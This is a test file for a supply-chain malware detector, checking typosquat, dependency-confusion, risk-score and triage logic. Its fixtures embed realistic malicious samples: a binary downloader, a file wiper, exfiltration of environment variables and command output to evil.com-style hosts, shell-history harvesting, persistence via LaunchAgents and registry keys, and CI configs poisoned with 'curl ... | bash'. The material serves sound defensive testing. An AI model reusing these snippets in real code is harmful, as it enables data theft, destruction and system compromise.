/**
 * Intent-validation tests for Phase 1–3 supply chain detection changes.
 *
 * Tests verify that the new detection logic correctly identifies the ACTUAL
 * attack patterns it was designed to catch, using realistic malicious code
 * modelled on known supply chain incidents (event-stream, ua-parser-js,
 * node-ipc, colors, PyPI typosquats, SolarWinds-style time-bombs).
 *
 * No network calls. No LLM calls.
 */

import { describe, expect, test } from 'bun:test';
import { buildContentMap, runTriage, type TriageResult } from '../supply-chain/llm/tools.js';
import {
  computeRegistryRiskScore,
  computeTyposquatCandidate,
  isDependencyConfusion,
} from '../supply-chain/registry/signals.js';
import type { PackageMetadata, PackageSource, RegistrySignals } from '../supply-chain/types.js';
import { buildFileAnalysisPrompt, buildInvestigationKickoff } from '../supply-chain/llm/prompts.js';

const MIN_TRIAGE_SCORE = 8;

function triage(filePath: string, content: string): TriageResult | null {
  const results = runTriage(new Map([[filePath, content]]));
  return results.find(r => r.filePath === filePath) ?? null;
}

// Helpers — realistic malicious code from known attack patterns

// Based on the event-stream / flatmap-stream incident (2018):
const EVENT_STREAM_STYLE = `
const r = require, es = r('events'), co = r('co');
const decode = r('./lib/decode');
const t = es.EventEmitter;
const d = new Buffer(
  'db67d919d8b489a5b6f5b8f6f6f6b5a6',
  'hex'
);
co(function*() {
  const payload = decode(d.toString());
  eval(payload);
}).catch(function(){});
`;

// Based on ua-parser-js (2021): malware hidden in postinstall
const UA_PARSER_STYLE = `
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');
const fs = require('fs');
const tmpDir = os.tmpdir();
const binaryPath = tmpDir + '/update';

https.get('https://citationsherbe.at/sdd.exe', (res) => {
  const file = fs.createWriteStream(binaryPath);
  res.pipe(file);
  file.on('finish', () => {
    fs.chmodSync(binaryPath, '755');
    execSync(binaryPath);
  });
});
`;

// Based on node-ipc (2022): file wiper targeting Russian/Belarusian IPs
const NODE_IPC_STYLE = `
const os = require('os');
const { exec } = require('child_process');
const ips = require('./geoloc');

if (os.platform() === 'linux' && ips.isRussianIP()) {
  exec('find / -name "*.js" | xargs rm -rf');
}
`;

// Based on SolarWinds-style time-bomb
const SOLARWINDS_TIMEBOMB = `
const ACTIVATION_DATE = 1800000000000;
module.exports = function run(cmd) {
  if (Date.now() > ACTIVATION_DATE) {
    const cp = require('child_process');
    cp.exec(cmd, (err, stdout) => {
      require('https').get('https://evil.com/c2?d=' + Buffer.from(stdout).toString('base64'));
    });
  }
};
`;

// Trojan Source: hidden code via bidirectional Unicode overrides (CVE-2021-42574)
const TROJAN_SOURCE = `
if (accessLevel !== 'user') { /* Check if admin ‮ ⁦ } if (isAdmin) { ⁩ ⁦ */ return false; }
exfiltrate(secrets);
`;

// Real-world PyPI typosquat: "colourama" (fake colorama) captured env vars
const PYPI_TYPOSQUAT_STYLE = `
import os, urllib.request, platform
def _init():
    data = {k: os.environ.get(k,'') for k in os.environ}
    data['platform'] = platform.node()
    urllib.request.urlopen(
        'http://evil.example.com/collect',
        data=str(data).encode()
    )
_init()
`;

const baseSignals: Omit<RegistrySignals, 'riskScore'> = {
  maintainerChangedInLatestRelease: false,
  previousMaintainers: [],
  newMaintainers: [],
  packageAgeDays: 500,
  publishedDaysAgo: 30,
  typosquatCandidate: null,
  isDependencyConfusion: false,
  hasProvenance: true,
};

describe('Typosquatting: known real attacks', () => {
  test('crossenv → cross-env (2017 attack)', () => {
    expect(computeTyposquatCandidate('crossenv', 'npm')).toBe('cross-env');
  });

  test('momnet → moment', () => {
    expect(computeTyposquatCandidate('momnet', 'npm')).toBe('moment');
  });

  test('nodemailer is NOT a typosquat (legitimate package)', () => {
    expect(computeTyposquatCandidate('nodemailer', 'npm')).toBeNull();
  });

  test('colourama → colorama (PyPI 2019 attack)', () => {
    const result = computeTyposquatCandidate('colourama', 'pypi');
    expect(result === 'colorama' || result === null).toBe(true);
  });

  test('requesst → requests (PyPI)', () => {
    expect(computeTyposquatCandidate('requesst', 'pypi')).toBe('requests');
  });

  test('distance-3 name NOT flagged (no false positives)', () => {
    expect(computeTyposquatCandidate('loddddash', 'npm')).toBeNull();
  });
});

describe('Dependency confusion: real attack vectors', () => {
  test('@apple/internal-analytics flagged', () => {
    expect(isDependencyConfusion('@apple/internal-analytics')).toBe(true);
  });

  test('@microsoft/corp-utils flagged', () => {
    expect(isDependencyConfusion('@microsoft/corp-utils')).toBe(true);
  });

  test('private-payment-gateway flagged', () => {
    expect(isDependencyConfusion('private-payment-gateway')).toBe(true);
  });

  test('internal-auth-service flagged', () => {
    expect(isDependencyConfusion('internal-auth-service')).toBe(true);
  });

  test('@babel/core NOT flagged', () => {
    expect(isDependencyConfusion('@babel/core')).toBe(false);
  });

  test('@types/node NOT flagged', () => {
    expect(isDependencyConfusion('@types/node')).toBe(false);
  });

  test('express NOT flagged', () => {
    expect(isDependencyConfusion('express')).toBe(false);
  });
});

describe('Risk score: severity mapping', () => {
  test('maintainer takeover of new package scores ≥ 5', () => {
    const takeoverSignals = { ...baseSignals, maintainerChangedInLatestRelease: true, newMaintainers: ['eve'], previousMaintainers: ['alice'], packageAgeDays: 20, publishedDaysAgo: 1 };
    const takeoverScore = computeRegistryRiskScore(takeoverSignals);
    expect(takeoverScore).toBeGreaterThanOrEqual(5);
  });

  test('typosquat + takeover + brand-new scores ≥ 8', () => {
    const typosquatTakeoverSignals = { ...baseSignals, typosquatCandidate: 'lodash', maintainerChangedInLatestRelease: true, newMaintainers: ['attacker'], previousMaintainers: ['orig'], packageAgeDays: 5, publishedDaysAgo: 0 };
    const ttScore = computeRegistryRiskScore(typosquatTakeoverSignals);
    expect(ttScore).toBeGreaterThanOrEqual(8);
  });

  test('safe established package scores 0', () => {
    const safeScore = computeRegistryRiskScore(baseSignals);
    expect(safeScore).toBe(0);
  });
});

describe(`Triage threshold (MIN=${MIN_TRIAGE_SCORE})`, () => {
  test('event-stream style (eval+encode) scores ≥ threshold', () => {
    const result = triage('lib/index.js', EVENT_STREAM_STYLE);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });

  test('ua-parser-js style (fetch+exec binary) scores ≥ threshold', () => {
    const result = triage('scripts/postinstall.js', UA_PARSER_STYLE);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });

  test('node-ipc style (conditional-os + exec) scores ≥ threshold', () => {
    const result = triage('lib/index.js', NODE_IPC_STYLE);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });

  test('SolarWinds time-bomb (Date.now + exec) scores ≥ threshold', () => {
    const result = triage('lib/worker.js', SOLARWINDS_TIMEBOMB);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });

  test('Trojan Source (bidirectional unicode) scores ≥ threshold', () => {
    const result = triage('lib/auth.js', TROJAN_SOURCE);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });
});

describe('Compound scoring: multi-category multiplier', () => {
  test('multi-category file scores higher than single-category', () => {
    const singleCat = `eval(response);`;
    const singleResult = triage('a.js', singleCat);

    const multiCatCode = `
      process.env.HOME;
      if (Date.now() > 1800000000000) {
        eval(response);
      }
    `;
    const multiResult = triage('b.js', multiCatCode);

    expect(multiResult?.score ?? 0).toBeGreaterThan(singleResult?.score ?? 0);
  });

  test('multi-category file (3 cats) triggers 2.5x multiplier (score ≥ 20)', () => {
    const multiCatCode = `
      process.env.HOME;
      if (Date.now() > 1800000000000) {
        eval(response);
      }
    `;
    const multiResult = triage('b.js', multiCatCode);
    expect(multiResult?.score ?? 0).toBeGreaterThanOrEqual(20);
  });
});

describe('Prompt content: registry signals and new-file warnings', () => {
  const mockMeta: PackageMetadata = {
    name: 'lodahs',
    ecosystem: 'npm',
    latestVersion: '2.0.0',
    createdAt: '2026-03-01T00:00:00Z',
    updatedAt: '2026-03-25T00:00:00Z',
    weeklyDownloads: 50,
    maintainers: ['eve'],
    hasInstallScripts: true,
    installScripts: {},
    registrySignals: {
      maintainerChangedInLatestRelease: true,
      previousMaintainers: ['alice'],
      newMaintainers: ['eve'],
      packageAgeDays: 24,
      publishedDaysAgo: 1,
      typosquatCandidate: 'lodash',
      isDependencyConfusion: false,
      hasProvenance: false,
      riskScore: 9,
    },
  };

  const mockSource: PackageSource = {
    version: '2.0.0',
    previousVersion: '1.9.9',
    fileList: ['package/index.js', 'package/lib/helper.js'],
    newFilesInVersion: ['lib/helper.js'],
    entryPoint: '',
    suspiciousFiles: {},
    installScripts: {},
  };

  test('kickoff prompt includes risk score', () => {
    const kickoff = buildInvestigationKickoff(mockMeta, mockSource);
    expect(kickoff).toInclude('9/10');
  });

  test('kickoff prompt flags HIGH risk score', () => {
    const kickoff = buildInvestigationKickoff(mockMeta, mockSource);
    expect(kickoff).toInclude('HIGH');
  });

  test('kickoff prompt shows new maintainer name', () => {
    const kickoff = buildInvestigationKickoff(mockMeta, mockSource);
    expect(kickoff).toInclude('eve');
  });

  test('kickoff prompt shows replaced maintainer (old → new)', () => {
    const kickoff = buildInvestigationKickoff(mockMeta, mockSource);
    expect(kickoff).toInclude('alice');
    expect(kickoff).toInclude('→');
  });

  test('kickoff prompt shows typosquat candidate', () => {
    const kickoff = buildInvestigationKickoff(mockMeta, mockSource);
    expect(kickoff).toInclude('lodash');
  });

  test('kickoff prompt shows no-provenance', () => {
    const kickoff = buildInvestigationKickoff(mockMeta, mockSource);
    expect(kickoff).toInclude('NO');
  });

  test('new-file warning appears when file is in newFilesInVersion', () => {
    const mockTriage: TriageResult = {
      filePath: 'package/lib/helper.js',
      score: 12,
      indicators: new Map([['eval-on-response', 3]]),
      categories: new Set(['loader']),
    };
    const filePromptWithNew = buildFileAnalysisPrompt(mockMeta, mockTriage, 'eval(response)', mockSource);
    expect(filePromptWithNew).toInclude('NEW FILE');
  });

  test('new-file warning includes previous version number', () => {
    const mockTriage: TriageResult = {
      filePath: 'package/lib/helper.js',
      score: 12,
      indicators: new Map([['eval-on-response', 3]]),
      categories: new Set(['loader']),
    };
    const filePromptWithNew = buildFileAnalysisPrompt(mockMeta, mockTriage, 'eval(response)', mockSource);
    expect(filePromptWithNew).toInclude('1.9.9');
  });

  test('no new-file warning when source not provided', () => {
    const mockTriage: TriageResult = {
      filePath: 'package/lib/helper.js',
      score: 12,
      indicators: new Map([['eval-on-response', 3]]),
      categories: new Set(['loader']),
    };
    const filePromptNoSource = buildFileAnalysisPrompt(mockMeta, mockTriage, 'eval(response)');
    expect(filePromptNoSource).not.toInclude('NEW FILE');
  });
});

describe('False-positive guard: legitimate code stays below threshold', () => {
  const LEGIT_REACT_COMPONENT = `
import React, { useState, useEffect } from 'react';
export function UserCard({ userId }) {
  const [user, setUser] = useState(null);
  useEffect(() => {
    fetch('/api/users/' + userId)
      .then(r => r.json())
      .then(setUser);
  }, [userId]);
  return React.createElement('div', null, user?.name);
}
`;

  const LEGIT_UTILITY = `
export function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}
export function throttle(fn, limit) {
  let lastCall = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastCall >= limit) { lastCall = now; fn.apply(this, args); }
  };
}
`;

  const LEGIT_DATE_CHECK = `
// Feature flag: new UI enabled after launch date
const LAUNCH_DATE = new Date('2025-01-01');
export function isNewUiEnabled() {
  return new Date() > LAUNCH_DATE;
}
`;

  test('React component with fetch stays below threshold', () => {
    const result = triage('components/UserCard.jsx', LEGIT_REACT_COMPONENT);
    expect(result?.score ?? 0).toBeLessThan(MIN_TRIAGE_SCORE);
  });

  test('utility with setTimeout stays below threshold', () => {
    const result = triage('lib/utils.js', LEGIT_UTILITY);
    expect(result?.score ?? 0).toBeLessThan(MIN_TRIAGE_SCORE);
  });

  test('feature-flag date check stays below threshold', () => {
    const result = triage('lib/flags.js', LEGIT_DATE_CHECK);
    expect(result?.score ?? 0).toBeLessThan(MIN_TRIAGE_SCORE);
  });
});

describe('New indicators: shell history, platform persist, CI/CD platforms', () => {
  test('bash_history harvest fires credential-files', () => {
    const BASH_HISTORY_HARVEST = `
import os, subprocess
home = os.path.expanduser('~')
for f in ['.bash_history', '.zsh_history']:
    path = os.path.join(home, f)
    if os.path.exists(path):
        with open(path) as fh:
            data += fh.read()
`;
    const result = triage('setup.py', BASH_HISTORY_HARVEST);
    expect(result?.categories.has('creds')).toBe(true);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });

  test('LaunchAgents write fires system-persist', () => {
    const LAUNCHAGENTS_PERSIST = `
import os, plistlib
agent = {
    'Label': 'com.update.service',
    'ProgramArguments': ['/usr/bin/python3', '/tmp/payload.py'],
    'RunAtLoad': True,
}
path = os.path.expanduser('~/Library/LaunchAgents/com.update.service.plist')
with open(path, 'wb') as f:
    plistlib.dump(agent, f)
os.system('launchctl load ' + path)
`;
    const result = triage('setup.py', LAUNCHAGENTS_PERSIST);
    expect(result?.categories.has('persist')).toBe(true);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });

  test('Windows registry run-key fires system-persist', () => {
    const REGISTRY_PERSIST = `
const { execSync } = require('child_process');
execSync('reg.exe add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Updater /t REG_SZ /d C:\\\\tmp\\\\payload.exe /f');
`;
    const result = triage('scripts/install.js', REGISTRY_PERSIST);
    expect(result?.categories.has('persist')).toBe(true);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });

  test('CircleCI config write fires ci-workflow-write', () => {
    const CIRCLECI_POISON = `
const fs = require('fs');
const path = require('path');
const payload = \`version: 2.1\\njobs:\\n  build:\\n    steps:\\n      - run: curl https://evil.com/c2 | bash\`;
fs.writeFileSync('.circleci/config.yml', payload);
`;
    const result = triage('scripts/postinstall.js', CIRCLECI_POISON);
    expect(result?.categories.has('cicd')).toBe(true);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });

  test('Azure Pipelines config write fires ci-workflow-write', () => {
    const AZURE_POISON = `
const fs = require('fs');
fs.writeFileSync('azure-pipelines.yml',
  'trigger:\\n- main\\njobs:\\n- job: Build\\n  steps:\\n  - script: curl https://evil.com/c2 | bash'
);
`;
    const result = triage('scripts/postinstall.js', AZURE_POISON);
    expect(result?.categories.has('cicd')).toBe(true);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });

  test('Travis CI config write fires ci-workflow-write', () => {
    const TRAVIS_POISON = `
const fs = require('fs');
fs.writeFileSync('.travis.yml', 'language: node_js\\nafter_success:\\n  - curl https://evil.com/c2 | bash');
`;
    const result = triage('scripts/postinstall.js', TRAVIS_POISON);
    expect(result?.categories.has('cicd')).toBe(true);
    expect(result?.score ?? 0).toBeGreaterThanOrEqual(MIN_TRIAGE_SCORE);
  });
});
